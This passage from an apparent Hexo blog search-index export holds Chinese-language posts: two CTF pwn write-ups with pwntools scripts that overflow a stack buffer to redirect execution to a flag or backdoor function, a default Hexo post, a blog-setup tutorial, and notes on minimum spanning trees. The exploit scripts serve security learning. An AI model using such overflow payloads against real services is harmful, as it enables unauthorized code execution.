class="line">elf = ELF(<span class="string">&#x27;./pwn2&#x27;</span>) </span><br><span class="line"><span class="comment"># get_flag=elf.sym[&#x27;get_flag&#x27;] #查找get_flag函数的地址</span></span><br><span class="line">get_flag_addr = <span class="number">0x08048586</span> <span class="comment">#get_flag 函数地址 </span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#构造栈溢出 payload </span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(<span class="number">0x8048586</span>) <span class="comment"># 覆盖返回地址为 get_flag，32位程序用 p32</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload) <span class="comment">#发送 payload</span></span><br><span class="line">p.interactive() <span class="comment">#交互获取 flag 输出 </span></span><br></pre></td></tr></table></figure><p><img src="/images/6BDB377B-73EA-4D11-9676-CA8F8310F6CE.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>overflower</title>
      <link href="/2025/06/d786e5211cbf.html"/>
      <url>/2025/06/d786e5211cbf.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/705048A9-C62E-4272-B122-5AF2FADA48EF.png"><br><img src="/images/Pastedimage20250615160603.png"><br><img src="/images/Pastedimage20250615160614.png"><br><img src="/images/Pastedimage20250615160623.png"><br><img src="/images/Pastedimage20250615160632.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; &#x27;</span>,端口号)  </span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x401146</span>  </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> +p64(<span class="number">0x40115B</span>) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250615160703.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Learning </category>
          
          <category> 5-栈溢出与ROP </category>
          
          <category> 栈溢出（Stack Overflow） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/06/c0e0ed6e703e.html"/>
      <url>/2025/06/c0e0ed6e703e.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>替换图片路径</p><ol><li><strong>搜索</strong>：<code>!\[(.*?)\]\((.*?)\.(png|jpg|jpeg|gif|webp)\)</code><br> （匹配 Markdown 图片语法：<code>![描述](images/路径.png)</code>）</li><li><strong>替换</strong>：<code>![$1](/images/$2.$3)</code><br> （将路径部分替换为 <code>/images/</code> 开头）</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Rhea的个人博客搭建教程</title>
      <link href="/2025/06/11915e8c8095.html"/>
      <url>/2025/06/11915e8c8095.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250612191927.png"></p><ul><li>public 最终所见网页的所有内容</li><li>node_modules 插件以及hexo所需node.js模块</li><li>_config.yml 站点配置文件，设定一些公开信息等</li><li>package.json 应用程序信息，配置hexo运行所需js包</li><li>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容</li><li>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）</li><li>source 用于存放用户资源（除 <em>posts 文件夹，其余命名方式为 “</em> + 文件名”的文件被忽略）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s# 开启本地预览服务</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250612192246.png"></p><p><img src="/images/b8166acda25c9e43f82211f2033095c.png">git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly<br><strong>操作步骤</strong>：<br>① 新建自定义 CSS：在 <code>themes/butterfly/source/css/</code> 目录创建 <code>transparency.css</code>，写入透明样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页面背景透明 */</span> </span><br><span class="line"><span class="selector-id">#web_bg</span> &#123; <span class="attribute">opacity</span>: <span class="number">0.8</span>; <span class="comment">/* 若主题已设置背景图，可叠加透明：background: rgba(255,255,255,0.8); */</span> &#125; <span class="comment">/* 卡片（文章、侧边栏）透明 */</span> <span class="selector-class">.card-widget</span>, <span class="selector-class">.post-content</span> &#123; <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="meta">!important</span>; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/denjones/hexo-theme-chan.git">https://github.com/denjones/hexo-theme-chan.git</a><br><img src="/images/Pastedimage20250612205412.png"><br><img src="/images/Pastedimage20250612205824.png"></p><h2 id="二级标题1"><a href="#二级标题1" class="headerlink" title="二级标题1"></a>二级标题1</h2><p>“Live loud, leave a mark.”<br>“Walk alone, walk tall.”</p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>替换图片markdown格式<br>Ctrl + Shift + F<br>Ctrl + Shift + H</p><ul><li>上方：搜索内容（ <code>!\[\[(.*?)\]\]</code>）</li><li>下方：替换内容（<code>![](/assets/images/$1)</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> hexo-blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图</title>
      <link href="/2025/06/c3f31b69c914.html"/>
      <url>/2025/06/c3f31b69c914.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-最小生成树概念"><a href="#1-最小生成树概念" class="headerlink" title="1. 最小生成树概念"></a>1. 最小生成树概念</h3><p>生成树概念：</p><blockquote><p><strong>无向图中</strong>，一个<strong>连通图</strong>的最小连通子图称作该图的生成树（不能带环，保持连通，但边要尽可能的少）。<br>有n个顶点的连通图的生成树有n个顶点和<strong>n-1条边</strong>。<br>比如：<br><img src="/images/https:/i-blog.csdnimg.cn/blog_migrate/9d864e26aa58c0192ce2318935b1caa1.png" alt="在这里插入图片描述"></p></blockquote><p>这里的最小其实是指的边的<strong>权值之和最小</strong>，当然是要在保证它是生成树的前提下权值之和最小。<br>所以，对于一个连通图来说，在它的所有的生成树里面，边的权值之和最小的生成树就是该连通图的最小生成树，当然最小生成树也可以有多个，因为边的权值是可以相等的。</p><p>连通图中的每一棵生成树，都是原图的一个<strong>极大无环子图</strong>，即：<strong>从其中删去任何一条边，生成树就不再连通；反之，在其中引入任何一条新边，都会形成一条回路。</strong></p><p>若连通图由n个顶点组成，<strong>&#x3D;&#x3D;则其生成树必含n个顶点和n-1条边&#x3D;&#x3D;</strong>。因此构造最小生成树的准则有三条：</p><ol><li>只能使用图中权值最小的边来构造最小生成树</li><li>只能使用恰好n-1条边来连接图中的n个顶点</li><li>选用的n-1条边不能构成回路</li></ol><p>构造最小生成树的方法：<br>Kruskal算法和Prim算法。<br>这两个算法都采用了逐步求解的贪心策略。</p><p>贪心算法：<br>是指在问题求解时，总是做出当前看起来最好的选择。<br>也就是说贪心算法做出的不是整体最优的的选择，而是某种意义上的局部最优解。<br><strong>贪心算法不是对所有的问题都能得到整体最优解。</strong></p><h3 id="Prim算法（普里姆）"><a href="#Prim算法（普里姆）" class="headerlink" title="&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;"></a>&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;</h3><p>思想：首先，选一个顶点作为起点，选哪个都可以；然后呢，它在选边的时候把图里面的顶点分成了两个集合，一个集合是已经被选到的结点组成的集合，另一个集合是剩下的结点组成的集合。<br>每次选边的时候是从<strong>两个集合中的顶点直接相连的边中选取权值最小的那一条。</strong></p><p>&#x3D;&#x3D;Kruskal算法（克鲁斯卡尔）&#x3D;&#x3D;<br>算法思想：<br>任给一个有n个顶点的连通图N&#x3D;{V,E}，<br>首先构造一个由这n个顶点组成、不含任何边的图G&#x3D;{V,NULL}，其中每个顶点自成一个连通分量（集合），其次不断从E中取出权值最小的一条边(若有多条权值相等任取其一)，若该边的两个顶点来自不同的连通分量，则将此边加入到G中。如此重复，直到所有顶点在同一个连通分量上为止。<br>核心：每次迭代时，选出一条具有最小权值的边，且边的两端点不在同一连通分量（集合）上，则加入生成树。<br>&#x3D;&#x3D;其实就是每次从图中还未被选到的所有的边里面选出权值最小且不会构成环的边，选够n-1条就完成了，这n-1条边构成的生成树就是该图对应的最小生成树。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Data structure </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
